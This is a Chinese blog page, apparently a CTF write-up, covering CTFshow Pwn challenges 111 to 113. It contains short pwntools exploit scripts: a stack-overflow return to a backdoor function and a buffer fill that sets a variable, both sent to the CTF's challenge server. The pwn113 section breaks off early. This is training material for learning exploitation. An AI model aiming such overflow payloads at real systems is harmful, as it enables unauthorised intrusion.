@@ -1,0 +1,1163 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fufu.png">
+  <link rel="icon" href="/img/fufu.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Meiyouqian">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="pwn111  保护：   题目说没难度，来品品，只开了NX     明显栈溢出offset &#x3D; 0x80+8   还有后门函数，直接读flag的，我们栈溢出过去就好了do_global &#x3D; 0x400697 12345678910from pwn import *context(arch&#x3D;&#x27;amd64&#x27;,os&#x3D;&#x27;linux&#x27;,log_l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFshow-Pwn入门Bypass安全机制(111-120))">
+<meta property="og:url" content="https://mei-you-qian.github.io/2026/04/10/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/index.html">
+<meta property="og:site_name" content="玫幽倩的小博客">
+<meta property="og:description" content="pwn111  保护：   题目说没难度，来品品，只开了NX     明显栈溢出offset &#x3D; 0x80+8   还有后门函数，直接读flag的，我们栈溢出过去就好了do_global &#x3D; 0x400697 12345678910from pwn import *context(arch&#x3D;&#x27;amd64&#x27;,os&#x3D;&#x27;linux&#x27;,log_l">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774406822930-c64a9290-0448-42a2-9eaf-97c69c7ab0f5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774407254318-9773a1b2-9b4b-46a5-bc20-e868753d1248.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774407310270-71fc508c-0202-46e1-a6cd-819b7a2bab6f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774407960133-15a8e5e8-6f01-493b-a589-0e1cdcb9ce3f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774408325139-3043ad50-b646-4775-81fe-fa61e6a8cead.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774408492944-76d49b0d-7c62-4c04-8474-36c0b5dd01b8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774408513963-21af102e-4b23-4336-a89c-03d5684ca913.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774408558208-63167154-f069-48c0-8ae5-e9d9e7117a98.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774408691181-d00c8fc2-ae89-4017-9442-c0d75b27504a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774409087991-fe9077e7-82bd-439c-908e-939dadd3ed2d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774409801256-fa3d8b1c-6978-4616-bed9-09efcd02aaf2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774409851485-d31d3bf8-3a11-4c53-9ab2-8761e1860d6d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774409915663-6b92be6c-3232-47fb-96d7-bc8ff9524586.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774409949193-5b36e201-e095-4670-92da-58dea6b4c919.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774879244101-f16c5a15-8474-4a9c-b7cc-db9a504811bd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774972216807-cc9e0650-4f2c-4676-9ca8-e17a59264e76.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774972261044-e6824d00-85df-4ccd-89df-087f9bcabd70.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775013995238-3be916a6-ae94-4244-9557-5e1f5a793d0a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014059663-6f461496-53f0-4188-a4b9-40f231dd63d9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014107945-ecd6a8e2-52b1-4672-971e-1ffd6520d4d2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014619735-8d9110cb-4d85-4356-90e4-5fa09f3029a4.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014687377-b08c0f3f-9c30-4db3-b1f7-570c667f2cd6.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014351130-f12e1b1f-d81e-4ad6-a339-54e5bb3e823e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014356805-17399b34-f4a5-4d4e-ad53-c1183da649bb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014970445-21d020ea-b7eb-46ed-9794-1d5a43565a2e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014996120-061b3ba8-eff7-4d6d-b1d7-888193560406.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775015052229-54535400-8d1b-45f0-9e28-e279191a75e4.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775018904178-beccfc88-ce22-4b59-bfbb-6dd7d2337b86.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775018887214-4b2be23e-3c00-41ce-be00-b6423797113c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021208472-ea518ac2-6681-49b3-b4c5-46f49d95969d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021055256-ef1ca4eb-caf5-459e-aa2c-cf1d93e1298d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021092862-8a8abcb9-b5dd-487c-99d6-9c141673bb31.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021256441-4599bfeb-0ee5-468f-8ad5-eab2551f1c8b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021864578-eff0a03d-47ff-4640-96c1-9522173de59e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021965328-35f480db-bf45-4c0b-9b38-e02ff6c2e1fb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021993607-b573af85-13d5-45f6-a96f-8e3e4bc373db.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775022043623-bb7fe75e-902e-4c92-b6da-1036e42966d8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775022068693-b511a088-3892-41c5-a5e1-ff88b90a183d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775024676159-7ee95b2b-a422-4059-bee2-c974a3db666a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775024729689-5d5d7dc7-e548-436e-a0c8-59288da7c5bb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775024747602-70a5461a-51f2-4425-a734-31eec3e8a6de.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775024753933-9f8ddb84-a8c6-49e7-af3b-f211baf8e0db.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775024994253-3eac06af-dae8-42de-be2c-d2982270d590.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775025017515-a2f6460c-dbe2-4b67-b875-b7f8aba49791.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775025052042-c7acd07a-0edf-4aaf-ba2d-4e1825a90eb4.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775025088033-f6320fbe-33e9-4443-9555-123fcbdf1db8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775025494621-cba0f6f7-9999-40a1-a5c6-e159583e989b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775027303684-cfcdbff5-92e1-4018-b3f1-77e24a4a7418.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775030127143-6de0cb91-b639-4e3d-942a-2da24d437c48.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775031169933-7283d272-17af-4f82-83ef-6bae22c985c9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775031203634-575985f0-3289-4fd6-a502-83fe023c8a0f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775031548650-bb8d6489-c47f-4a9f-aaf8-1da1ac11b03e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775031640409-edef1d98-03a5-4e67-b136-26493c1630c5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775031579242-00489c88-3538-406a-8e65-f67f720f35e2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775032091125-e406a593-44a7-42da-ae53-37f8c509b3cc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775032504798-e5313c07-edba-40cb-9018-ead90324c54a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775032542851-a9b0e334-a840-4040-85df-5daf0b687306.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775032582109-a25523a8-e7ad-4e6c-af9b-1199bfdc07df.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775051037998-97094925-ec35-46ba-ae21-647eefae9e04.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775051200873-47b8d84b-000b-4e81-86c6-2cc63d2ba6d7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775051281905-25034190-b2d0-4d07-84ed-9f302cb07839.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775052892548-2d614bf0-0584-43d0-b0e9-e683af79a03d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775053132564-84337813-d0fe-44c3-be45-e4b175072046.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775053704030-2a27e268-9154-4ae8-ab11-4cc632ac353b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775053719943-5798946e-40a1-4da8-9129-4c8486cd9423.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775053744719-729dc8d2-df00-4c9e-8eaa-4d02ae3597a1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775053813582-49391a7d-2815-4636-a943-113f96d8b459.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775053852693-52b3a84b-ad78-479b-8b07-cb2c0c55b4f5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775055755376-3c0a5ad4-67fd-4d71-b7cd-6c58c09fd32e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775055899029-7ad4bb80-6307-49f7-947b-ce8f34a6f4cd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775056050316-a707f6f2-c86f-48d3-bab0-e3f288379ab9.png">
+<meta property="article:published_time" content="2026-04-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-10T00:53:40.276Z">
+<meta property="article:author" content="Meiyouqian">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://mei-you-qian.github.io/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774406822930-c64a9290-0448-42a2-9eaf-97c69c7ab0f5.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>CTFshow-Pwn入门Bypass安全机制(111-120)) - 玫幽倩的小博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/mk.css">
+<link rel="stylesheet" href="/css/selection.css">
+<link rel="stylesheet" href="/css/glassBg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"mei-you-qian.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>玫幽倩</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/beijing.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTFshow-Pwn入门Bypass安全机制(111-120))"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-10 00:00" pubdate>
+          2026年4月10日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CTFshow-Pwn入门Bypass安全机制(111-120))</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="pwn111"><a href="#pwn111" class="headerlink" title="pwn111"></a>pwn111</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774406822930-c64a9290-0448-42a2-9eaf-97c69c7ab0f5.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774407254318-9773a1b2-9b4b-46a5-bc20-e868753d1248.png" srcset="/img/loading.gif" lazyload></p>
+<p>题目说没难度，来品品，只开了NX</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774407310270-71fc508c-0202-46e1-a6cd-819b7a2bab6f.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774407960133-15a8e5e8-6f01-493b-a589-0e1cdcb9ce3f.png" srcset="/img/loading.gif" lazyload></p>
+<p>明显栈溢出offset &#x3D; 0x80+8</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774408325139-3043ad50-b646-4775-81fe-fa61e6a8cead.png" srcset="/img/loading.gif" lazyload></p>
+<p>还有后门函数，直接读flag的，我们栈溢出过去就好了do_global &#x3D; 0x400697</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from pwn import *<br>context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log<span class="hljs-emphasis">_level=&#x27;debug&#x27;)</span><br><span class="hljs-emphasis">io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28112)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">offset = 0x80+8</span><br><span class="hljs-emphasis">do_</span>global = 0x400697<br><br>payload = b&#x27;a&#x27;<span class="hljs-emphasis">*offset + p64(do_global)</span><br><span class="hljs-emphasis">io.sendline(payload)</span><br><span class="hljs-emphasis">io.interactive()</span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774408492944-76d49b0d-7c62-4c04-8474-36c0b5dd01b8.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag（的确简单啊</p>
+<h2 id="pwn112"><a href="#pwn112" class="headerlink" title="pwn112"></a>pwn112</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774408513963-21af102e-4b23-4336-a89c-03d5684ca913.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774408558208-63167154-f069-48c0-8ae5-e9d9e7117a98.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护开满了几乎，看起来是不太可能硬打，根据题目说满足一定条件即可</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774408691181-d00c8fc2-ae89-4017-9442-c0d75b27504a.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看IDA，发现了明显如果var[13] &#x3D;&#x3D; 0x11的时候有好东西</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774409087991-fe9077e7-82bd-439c-908e-939dadd3ed2d.png" srcset="/img/loading.gif" lazyload></p>
+<p>还真是，只要让var[13] &#x3D;&#x3D; 0x11，就能成功得到flag了</p>
+<p>我直接让var这个数组里全是0x11也可以吧，写个14个就到v[13]了</p>
+<p>写exp</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from pwn import *<br>context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log<span class="hljs-emphasis">_level=&#x27;debug&#x27;)</span><br><span class="hljs-emphasis">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28234)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">payload = p32(0x11)*0xe</span><br><span class="hljs-emphasis">io.sendline(payload)</span><br><span class="hljs-emphasis">io.interactive()</span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774409801256-fa3d8b1c-6978-4616-bed9-09efcd02aaf2.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功得到flag</p>
+<h2 id="pwn113"><a href="#pwn113" class="headerlink" title="pwn113"></a>pwn113</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774409851485-d31d3bf8-3a11-4c53-9ab2-8761e1860d6d.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774409915663-6b92be6c-3232-47fb-96d7-bc8ff9524586.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到开了Full RELRO，别的都没开，应该还是个栈溢出题目</p>
+<p>根据题目，主要是理清思路</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774409949193-5b36e201-e095-4670-92da-58dea6b4c919.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们拆开来好好看看这个main函数</p>
